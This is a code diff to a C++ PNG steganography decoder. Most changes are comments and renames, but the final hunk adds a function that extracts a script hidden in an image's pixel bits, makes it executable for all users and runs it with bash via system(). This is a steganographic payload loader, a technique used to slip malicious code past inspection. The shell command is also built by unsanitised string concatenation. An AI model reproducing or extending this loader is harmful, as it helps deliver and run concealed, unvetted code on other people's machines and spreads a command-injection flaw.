@@ -4,10 +4,14 @@
 #include <vector>
 #include <memory>
 #include <stdexcept>
-#include <fstream> 
+#include <fstream>
+#include <filesystem> // C++17 for setting permissions
 
+namespace fs = std::filesystem;
+
+// Existing decodeMessageFromPNG implementation
 std::string decodeMessageFromPNG(const std::string& imagePath) {
-    // Open file with RAII
+    // RAII for FILE*
     auto fileDeleter = [](FILE* fp) { if (fp) fclose(fp); };
     std::unique_ptr<FILE, decltype(fileDeleter)> fp(fopen(imagePath.c_str(), "rb"), fileDeleter);
     if (!fp) {
@@ -15,7 +19,7 @@ std::string decodeMessageFromPNG(const std::string& imagePath) {
         return "";
     }
 
-    // Create png read struct with RAII
+    // RAII for png_struct and png_info
     class PngReader {
     public:
         PngReader() {
@@ -85,7 +89,7 @@ std::string decodeMessageFromPNG(const std::string& imagePath) {
             }
         }
 
-        // Read first 32 bits to get message length
+        // Read the first 32 bits to get the message length
         if (binaryData.size() < 32) {
             std::cerr << "Error: Not enough data to read message length." << std::endl;
             return "";
@@ -96,7 +100,7 @@ std::string decodeMessageFromPNG(const std::string& imagePath) {
             messageLength = (messageLength << 1) | (binaryData[i] - '0');
         }
 
-        // Read message bits
+        // Now read the message bits
         size_t totalMessageBits = messageLength * 8;
         if (binaryData.size() < 32 + totalMessageBits) {
             std::cerr << "Error: Not enough data to read the entire message." << std::endl;
@@ -106,8 +110,10 @@ std::string decodeMessageFromPNG(const std::string& imagePath) {
         std::string binaryMessage = binaryData.substr(32, totalMessageBits);
 
         std::string decodedMessage;
+        decodedMessage.reserve(messageLength);
         for (size_t i = 0; i < binaryMessage.size(); i += 8) {
-            char byte = static_cast<char>(std::stoi(binaryMessage.substr(i, 8), nullptr, 2));
+            std::string byteString = binaryMessage.substr(i, 8);
+            char byte = static_cast<char>(std::stoi(byteString, nullptr, 2));
             decodedMessage += byte;
         }
 
@@ -120,18 +126,46 @@ std::string decodeMessageFromPNG(const std::string& imagePath) {
 }
 
 bool decodeFileFromPNG(const std::string& imagePath, const std::string& outputFilePath) {
-    std::string decodedMessage = decodeMessageFromPNG(imagePath);
-    if (decodedMessage.empty()) {
+    std::string decodedData = decodeMessageFromPNG(imagePath);
+    if (decodedData.empty()) {
         return false;
     }
 
-    // Write the decoded message to the output file
+    // Write the decoded data to the output file in binary mode
     std::ofstream outFile(outputFilePath, std::ios::binary);
     if (!outFile) {
         std::cerr << "Error: Unable to open output file " << outputFilePath << std::endl;
         return false;
     }
-    outFile.write(decodedMessage.data(), decodedMessage.size());
+    outFile.write(decodedData.data(), decodedData.size());
     outFile.close();
+    return true;
+}
+
+bool decodeAndExecuteScript(const std::string& imagePath, const std::string& outputScriptPath) {
+    // Decode the script and save it to the output path
+    if (!decodeFileFromPNG(imagePath, outputScriptPath)) {
+        std::cerr << "Failed to decode the script from the image." << std::endl;
+        return false;
+    }
+
+    // Set executable permissions using std::filesystem (C++17)
+    try {
+        fs::permissions(outputScriptPath,
+                        fs::perms::owner_exec | fs::perms::group_exec | fs::perms::others_exec,
+                        fs::perm_options::add);
+    } catch (const fs::filesystem_error& e) {
+        std::cerr << "Filesystem error while setting permissions: " << e.what() << std::endl;
+        return false;
+    }
+
+    // Execute the script using system()
+    std::string command = "bash \"" + outputScriptPath + "\"";
+    int ret = system(command.c_str());
+    if (ret != 0) {
+        std::cerr << "Error: Script execution failed with return code " << ret << std::endl;
+        return false;
+    }
+
     return true;
 }
